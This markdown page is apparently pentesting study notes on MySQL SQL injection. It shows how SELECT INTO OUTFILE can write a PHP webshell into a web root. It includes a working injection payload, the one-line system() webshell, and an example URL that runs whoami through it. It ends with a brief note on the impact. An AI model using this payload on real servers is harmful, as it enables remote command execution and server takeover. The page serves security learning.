---
cover: >-
  https://images.unsplash.com/photo-1662026911591-335639b11db6?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwyfHxteXNxbHxlbnwwfHx8fDE3MTU0NTU2ODV8MA&ixlib=rb-4.0.3&q=85
coverY: 0
---

# MySQL

In an SQL injection scenario using `SELECT INTO OUTFILE`, an attacker might exploit the vulnerability to upload a webshell onto the server. A webshell is a script that can be accessed via a web browser and allows the attacker to execute server commands, effectively giving them control over the server.

#### Example Scenario:

Imagine a website feature that allows users to export transaction details to a CSV file using a user-input controlled query, similar to the following:

```sql
SELECT transaction_details FROM transactions WHERE user_id = 'user_input';
```

An attacker could manipulate the `user_input` to end the initial query and append a malicious `SELECT INTO OUTFILE` command to upload a webshell:

```sql
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

**Breakdown of the Injection:**

1. **Termination of Original Query**: The attacker terminates the intended SQL query by injecting `1';` which effectively closes the user input for `user_id`.
2. **Webshell Payload**: The attacker starts a new query with `SELECT`, where the content to be selected is a PHP script: `<?php system($_GET["cmd"]); ?>`. This PHP script is a simple webshell that executes commands passed to it via the `cmd` GET parameter.
3. **File Creation**: The payload is written into a new file named `shell.php` in the `/var/www/html/` directory, which is typically accessible via the web browser.

**Result of the Exploit:**

*   If the server permissions allow writing files in the web directory and the application is vulnerable to SQL injection, this will create a file named `shell.php`. An attacker can then access this file via a web browser and execute server commands by appending a `cmd` parameter to the URL, like so:

    ```
    http://example.com/shell.php?cmd=whoami
    ```
* This URL would execute the `whoami` command on the server, and the output would be displayed in the browser, thus confirming the server's control to the attacker.

#### Impact:

This type of attack could lead to full server compromise, allowing an attacker to execute arbitrary commands, manipulate server data, or use the server to launch further attacks.

This example highlights the severity of SQL injection vulnerabilities and underscores the importance of validating and sanitizing all user inputs to prevent such security breaches.
